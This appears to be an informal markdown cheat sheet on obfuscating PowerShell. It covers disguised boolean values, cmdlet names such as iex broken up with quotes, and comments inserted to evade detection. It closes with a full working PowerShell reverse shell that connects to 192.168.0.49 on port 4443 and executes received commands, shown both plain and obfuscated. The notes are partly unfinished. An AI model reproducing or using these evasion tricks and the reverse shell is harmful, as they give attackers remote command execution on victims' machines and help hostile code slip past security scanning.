# PowahShell

## Obfuscating Boolean Values
It's super fun and easy to replace `$True` and `$False` values with other boolean equivalents, which are literaly unlimited. All of the examples below evaluate to `True`. You can reverse them to `False` by simply adding an exclamation mark before the expression (e.g., `![bool]0x01`):
 - Boolean typecast of literally anything that is not 0 or Null will return `True`:
 ```
 [bool]1254
 [bool]0x12AE
 [bool][convert]::ToInt32("111011", 2) # Converts a string to int from base 2 (binary)
 ![bool]$null
 ![bool]$False
 [bool]"Any non empty string"
 [bool](-12354893)   # Boolean typecast of a negative number 
 [bool](12 + (3 * 6))
 ```
 - Boolean typecast of any class will return `True` as well:
 ```
 [bool][bool]
 [bool][char]
 [bool][int] 
 [bool][string]
 [bool][double]
 [bool][short]
 [bool][decimal]
 [bool][byte]
 [bool][timespan]
 [bool][datetime]
 
 [bool][System.Collections.ArrayList]
 [bool][System.Collections.CaseInsensitiveComparer]
 [bool][System.Collections.Hashtable]
 # Well, you get the point.
 ```
 - The result of a comparison that evaluates to `True` (duh):
 ```
 (9999 -eq 9999)
 ([math]::Round([math]::PI) -eq (4583 - 4580))
 [Math]::E -ne [Math]::PI
 ```

 - Boolean type casting something you know will return a value Not equal to 0 (can also be a string, array, etc)
 ```
 [bool](Get-ChildItem -Path Env: | Where-Object {$_.Name -eq "username"})
 [bool]@(0x01BE)
 ```
 - Or you can just grab a `True` value from an object's attributes:
 ```
 [System.Data.AcceptRejectRule].Assembly.GlobalAssemblyCache
 [System.TimeZoneInfo+AdjustmentRule].IsAnsiClass
 [mailaddress].IsAutoLayout
 [ValidateCount].IsVisible
 ```
 !$False


In loops and comparisons....

## Cmdlet Quote Interruption
You can obfuscate cmdlets by adding single and/or double quotes in between their characters, as long as it's not at the beginning. It's super effective! For example, the expresion `iex "pwd"` can be substituted with:
```
i''ex "pwd"
i''e''x "pwd"
i''e''x'' "pwd"
ie''x'' "pwd"
iex'' "pwd"
i""e''x"" "pwd"
ie""x'' "pwd"

# and so on... but also:

i''ex "p''wd"
i''e''x "p''w''d"
i''e''x'' "p''w''d''"
ie''x'' "pw''d`"`""
iex'' "p`"`"w`"`"d`"`""
i""e''x"" "p`"`"w`"`"d''"
ie""x'' "p`"`"w''d`"`""

# You get the point.
```

## Adding Comments
Obfuscating a script by appending comments here and there might actually do the trick on its own:
for example, a reverse shell command could be obfuscated like this:

Original  
```$TCPClient = New-Object Net.Sockets.TCPClient('192.168.0.49', 4443);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()```

Modified (appended <# SOME RANDOM COMMENT #> in various places)
```$TCPClient = New-Object <# SOME RANDOM COMMENT #> Net.Sockets.TCPClient('192.168.0.49', 4443);$NetworkStream = $TCPClient.GetStream() <# SOME RANDOM COMMENT #>;$StreamWriter = New-Object <# SOME RANDOM COMMENT #> IO.StreamWriter($NetworkStream);function WriteToStream ($String) <# SOME RANDOM COMMENT #> {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); <# SOME RANDOM COMMENT #> $Output = try {Invoke-Expression $Command 2>&1 | Out-String} <# SOME RANDOM COMMENT #> catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()```
